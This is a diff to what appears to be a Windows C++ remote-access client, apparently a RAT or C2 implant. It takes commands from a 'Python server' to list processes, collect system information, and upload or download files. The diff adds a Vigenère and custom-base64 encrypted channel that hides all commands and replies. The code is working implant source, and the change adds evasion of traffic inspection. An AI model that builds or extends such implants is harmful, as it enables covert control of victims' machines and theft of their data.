@@ -12,13 +12,16 @@
 #include <iphlpapi.h>
 #include <sysinfoapi.h>
 #include <sstream>
+#include "vigCrypt.h"
+#include "b64.h"
 
 #pragma comment (lib, "ws2_32.lib")
 #pragma comment(lib, "iphlpapi.lib")
 #pragma warning(disable : 4996)
 
-
 using namespace std;
+
+string CUSTOM = "AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz4829316705+/";
 
 string get_proc_info(DWORD processID) {
 	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
@@ -271,8 +274,25 @@ string sys_info() {
 	return si;
 }
 
+string encode_val(string val, vigCrypt crypt) {
+	return crypt.encrypt(val);
+}
+
+string decode_val(string val, vigCrypt crypt) {
+	return crypt.decrypt(val);
+}
+
+string decode_key(string enc_key) {
+	char* cipher = (char*)malloc(enc_key.size() + 1);
+	memcpy(cipher, enc_key.c_str(), enc_key.size() + 1);
+	const char* pass = cipher;
+	string result = base64_decode(pass, false);
+	return result;
+}
+
 void main()
 {
+
 	string ipAddress = "127.0.0.1";			// IP Address of the server
 	int port = 25565;						// Listening port # on the server
 
@@ -314,6 +334,17 @@ void main()
 	
 	cout << "Connected to Python server...\n";
 
+	// Set-up encoded channel (Viginere/Custome B64)
+	char key_buf[1028];
+	int keyBytesReceived = recv(sock, key_buf, 1028, 0);
+	string enc_key;
+	if (keyBytesReceived > 0)
+	{
+		enc_key = string(key_buf, 0, keyBytesReceived);
+	}
+	string key = decode_key(enc_key);
+	vigCrypt crypt(key);
+
 	// Open loop to listen to requests from Python server...
 	BOOL running = TRUE;
 	while (running) {
@@ -321,10 +352,9 @@ void main()
 		int bytesReceived = recv(sock, buffer, 4096, 0);
 		if (bytesReceived > 0)
 		{
-			// Echo response to console
-			string resp = string(buffer, 0, bytesReceived);
+			string resp = decode_val(string(buffer, 0, bytesReceived), crypt);
 			if (resp == string("list_procs")) {
-				string procs = list_procs();
+				string procs = encode_val(list_procs(), crypt);
 				_Post_ _Notnull_ char *proc_list = (char*)malloc(procs.size() + 1);
 				memcpy(proc_list, procs.c_str(), procs.size() + 1);
 				//proc_list = procs.c_str();
@@ -335,10 +365,10 @@ void main()
 				char upload_buffer[4096];
 				int uploadBytesReceived = recv(sock, upload_buffer, 4096, 0);
 				if (bytesReceived > 0) {
-					string upload_resp = string(upload_buffer, 0, uploadBytesReceived);
+					string upload_resp = decode_val(string(upload_buffer, 0, uploadBytesReceived), crypt);
 					BOOL result = upload_file(upload_resp);
 					if (result) {
-						string succ = "Success! File has been uploaded";
+						string succ = encode_val("Success! File has been uploaded", crypt);
 						cout << succ;
 						_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
 						memcpy(succ_succ, succ.c_str(), succ.size() + 1);
@@ -346,7 +376,7 @@ void main()
 						free(succ_succ);
 					}
 					else {
-						string succ = "Failure! File has not been uploaded";
+						string succ = encode_val("Failure! File has not been uploaded", crypt);
 						cout << succ;
 						_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
 						memcpy(succ_succ, succ.c_str(), succ.size() + 1);
@@ -354,7 +384,7 @@ void main()
 						free(succ_succ);
 					}
 				} else {
-					string succ = "Failure! File has not been uploaded";
+					string succ = encode_val("Failure! File has not been uploaded", crypt);
 					cout << succ;
 					_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
 					memcpy(succ_succ, succ.c_str(), succ.size() + 1);
@@ -366,18 +396,19 @@ void main()
 				char download_buffer[4096];
 				int downloadBytesReceived = recv(sock, download_buffer, 4096, 0);
 				if (bytesReceived > 0) {
-					string download_resp = string(download_buffer, 0, downloadBytesReceived);
+					string download_resp = decode_val(string(download_buffer, 0, downloadBytesReceived), crypt);
 					string result = download_file(download_resp);
 					if (result != "FNF") {
 						//string succ = "Success! File has been uploaded";
 						//cout << succ;
+						result = encode_val(result, crypt);
 						_Post_ _Notnull_ char* succ_succ = (char*)malloc(result.size() + 1);
 						memcpy(succ_succ, result.c_str(), result.size() + 1);
 						send(sock, succ_succ, strlen(succ_succ), 0);
 						free(succ_succ);
 					}
 					else {
-						string succ = "Failure! File has not been downloaded";
+						string succ = encode_val("Failure! File has not been downloaded", crypt);
 						cout << succ;
 						_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
 						memcpy(succ_succ, succ.c_str(), succ.size() + 1);
@@ -386,7 +417,7 @@ void main()
 					}
 				}
 				else {
-					string succ = "Failure! File has not been downloaded";
+					string succ = encode_val("Failure! File has not been downloaded", crypt);
 					cout << succ;
 					_Post_ _Notnull_ char* succ_succ = (char*)malloc(succ.size() + 1);
 					memcpy(succ_succ, succ.c_str(), succ.size() + 1);
@@ -395,7 +426,7 @@ void main()
 				}
 			}
 			if (resp == string("sys_info")) {
-				string info = sys_info();
+				string info = encode_val(sys_info(), crypt);
 				_Post_ _Notnull_ char* info_report = (char*)malloc(info.size() + 1);
 				memcpy(info_report, info.c_str(), info.size() + 1);
 				//proc_list = procs.c_str();
@@ -414,6 +445,4 @@ void main()
 
 	// Cleanup winsock
 	WSACleanup();
-
-	system("pause");
 }
